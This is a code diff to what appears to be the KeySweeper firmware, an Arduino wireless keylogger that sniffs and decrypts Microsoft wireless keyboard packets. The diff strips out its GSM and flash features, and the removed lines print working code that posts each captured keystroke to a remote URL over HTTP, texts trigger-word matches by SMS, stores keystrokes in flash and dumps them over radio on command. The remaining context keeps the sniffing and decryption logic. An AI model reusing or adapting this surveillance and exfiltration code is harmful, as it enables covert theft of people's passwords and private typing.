@@ -154,12 +154,6 @@ void decrypt(uint8_t* p)
     p[i] ^= kbPipe >> (((i - 4) % 5) * 8) & 0xFF;
 }
 
-void got_sms()
-{
-#ifdef ENABLE_GSM
-  sms_interrupt = 1;
-#endif
-}
 
 // calculate microsoft wireless keyboard checksum
 void checksum(uint8_t* p, uint8_t ck_i, uint8_t ck_offset)
@@ -276,16 +270,7 @@ void sendSms(uint8_t j)
 {
   pr("Found trigger word: ");
   Serial.println(j);
-#ifdef GSM_ENABLED
-  pr("Sending SMS: ");
-  Serial.println(stack);
-
-  if (!fona.sendSMS(SMSnumber, stack))
-    prl("SMS failed");
-  else
-    prl("SMS sent!");
-#endif
-
+  
   // clear our array so we don't trigger again
   memset(&stack, 0, STACKLEN);  
 }
@@ -307,33 +292,10 @@ void sendKeystroke(char letter)
     radio.startListening();
   }
 
-  // send to our remote server
-  post_http(letter);
+
 }
 
-void storeKeystroke(char letter)
-{
-#ifdef FLASH
-  buffer[flashByte++] = letter;
-  if (flashByte == FLASHPAGE)
-  {
-    pr("Writing ");
-    Serial.println(flashAddy+FLASHPAGE);
-    for (int i = 0; i < FLASHPAGE; i++)
-    {
-      Serial.print((char)buffer[i]);
-    }
 
-    flash.writePage(flashAddy, buffer);
-    flashAddy += FLASHPAGE;
-    writeFlash();
-
-    flashByte = 0;
-    for (uint32_t i = 0; i < FLASHPAGE; i++)
-      buffer[i] = 0;
-  }
-#endif
-}
 
 /* microsoft keyboard packet structure:
  struct mskb_packet
@@ -356,32 +318,6 @@ void storeKeystroke(char letter)
  };
  */
 
-// check for flash
-void setupFlash()
-{
-#ifdef FLASH
-  spl("1setupFlash");
-
-  // isFlash will = the capacity
-  if (!(isFlash = flash.begin()))
-    return;
-
-  // initialize flash address location in eeprom if we don't already have one
-  int flashSetup = EEPROM.read(E_SETUP);
-  if (flashSetup != FLASHSETUP)
-  {
-    spl("Flash initializing");
-    flashAddy = 0x00;
-    writeFlash();
-
-    EEPROM.write(E_SETUP, FLASHSETUP);
-  }
-  else
-    flashAddy = eRead(E_FLASH_ADDY);
-  sp("Flash done: ");
-  Serial.println(flashAddy);
-#endif
-}
 
 uint8_t flush_rx(void)
 {
@@ -406,13 +342,6 @@ uint8_t flush_tx(void)
   return status;
 }
 
-void handle_sms()
-{
-#ifdef HANDLE_GSM
-  spl("handle_sms");
-  sms_interrupt = 0;
-#endif
-}
 
 void ledOn()
 {
@@ -435,13 +364,6 @@ void loop(void)
   uint8_t pipe_num;
   //  spl("loop");
 
-#ifdef ENABLE_GSM
-  // you'd think we'd just call handle_sms() from the interrupt,
-  // but the FONA will not behave properly if you access it from an interrupt,
-  // so we simply set a flag instead
-  if (sms_interrupt)
-    handle_sms();
-#endif
 
   // if our led is off (flash our led upon keystrokes for fun)
   if (strokeTime && millis() - strokeTime >= LED_TIME)
@@ -495,39 +417,6 @@ void loop(void)
         radio.setAutoAck(false); // don't autoack during rx
         radio.startListening();
       }
-#ifdef FLASH 
-      // is there space?
-      if (isFlash)
-      {
-        // F = dump flash
-        if (p[3] == 'F')
-        {
-          radio.openWritingPipe(backtraceIt);
-          radio.setAutoAck(true); // only autoack during tx
-          radio.stopListening();
-          flash.beginRead(0);
-
-          for (int j = 0; j < flashAddy; j += PKT_SIZE)
-          {
-            // send 16 bytes at a time
-            for (int k = 0; k < PKT_SIZE; k++)
-              op[k] = flash.readNextByte();
-
-            radio.write(op, PKT_SIZE);
-
-          }
-          radio.setAutoAck(false); // don't autoack during rx
-          radio.startListening();
-        }
-
-        // E = erase flash (which doesn't erase, we just set our pointer back to 0)
-        else if (p[4] == 'E')
-        {
-          flashAddy = 0x00;
-          writeFlash();
-        }
-      }
-#endif
 
       return;
     }
@@ -633,33 +522,7 @@ void pipe(uint64_t address)
  */
 
 
-#ifdef FLASH
-void eWrite(uint32_t addy, uint32_t buf)
-{
-  for (uint32_t i = 0; i < sizeof(uint32_t); i++)
-    EEPROM.write(addy, (buf >> (8 * i)) & 0xFF);
 
-  pr("Wrote: ");
-  Serial.print(buf);
-  pr(" ");
-  Serial.println(eRead(addy));
-}
-
-uint32_t eRead(uint32_t addy)
-{
-  uint32_t buf = 0;
-  for (uint32_t i = sizeof(uint32_t)-1; i >= 0; i--)
-  {
-    buf += EEPROM.read(addy + i);
-    pr("Reading from ");
-    Serial.print(addy, HEX);
-    pr(" buf ");
-    Serial.println(buf);
-    buf <<= 8;
-  }
-  return buf;
-}
-#endif
 
 
 uint8_t read_register(uint8_t reg, uint8_t* buf, uint8_t len)                       
@@ -890,103 +753,7 @@ void scanForKeySweeper()
 }
 
 
-void setupGsm()
-{
-#ifdef ENABLE_GSM
-  // attach interrupt to pin 2 (interrupt 0) for ring interrupt (when we recv SMS)
-  //attachInterrupt(0, got_sms, LOW);
 
-  sp("3setupGsm");
-
-  // See if the FONA is responding
-  while (! fona.begin(4800)) {  // make it slow so its easy to read!
-    spl("Couldn't find FONA GSM board, retrying");
-    delay(1000);
-  }
-  spl("GSM activated");
-
-  // Print SIM card IMEI number.
-  uint8_t imeiLen = fona.getIMEI(imei);
-  if (imeiLen > 0)
-    sp("SIM card IMEI: ");
-  Serial.println(imei);
-
-  // set the number of SMS's we currently have in EEPROM
-  int8_t smsnum = fona.getNumSMS();
-
-  if (smsnum < 0) {
-    spl("Could not read # SMS");
-  }
-  else {
-    sp("SMS on SIM card: ");
-    Serial.println(smsnum);
-
-    // save our sms number in EEPROM
-    last_sms = smsnum;
-  }
-#endif
-}
-
-boolean post_http(char letter)
-{
-#ifdef ENABLE_GSM
-  // Post data to website
-  uint16_t statuscode;
-  int16_t length;
-  char data[80];
-
-  char url[sizeof(URL)+100] = URL;
-
-  // make sure to overwrite null terminator
-  memcpy(&url[sizeof(URL)-1], imei, sizeof(imei));
-
-  //  pr(F("Data to post (e.g. \"foo\" or \"{\"simple\":\"json\"}\"):\n"));
-  data[0] = 'c';
-  data[1] = '=';
-  data[2] = letter;
-  data[3] = '\0';
-
-  pr("letter is ");
-  Serial.println(letter);
-  //  strcpy(data, letter);
-  //  strcpy(data, "keystrokes");
-  pr("Posting to ");
-  Serial.println(url);
-  Serial.println(data);
-
-
-  if (!fona.HTTP_POST_start(url, F("text/plain"), (uint8_t *) data, strlen(data), &statuscode, (uint16_t *)&length))
-  {
-    prl("HTTP POST failed!");
-    return false;
-  }
-
-  while (length > 0)
-  {
-    prl("length > 0");
-    while (fona.available())
-    {
-      char c = fona.read();
-      pr("c = ");
-      Serial.println(c);
-
-      // Serial.write is too slow, we'll write directly to Serial register!
-      loop_until_bit_is_set(UCSR0A, UDRE0); // Wait until data register empty. 
-      UDR0 = c;
-
-      length--;
-      if (! length) break;
-    }
-  }
-
-  fona.HTTP_POST_end();
-  return true;
-
-#endif
-
-  //  prl("GSM is not enabled");
-  return false;
-}
 
 void setup()
 {
@@ -996,9 +763,7 @@ void setup()
   Serial.begin(BAUDRATE);
 
   setTriggers();
-  setupGsm();
-  setupFlash();
-
+  
   spl("Radio setup");
   radio.begin();
   spl("End radio setup");
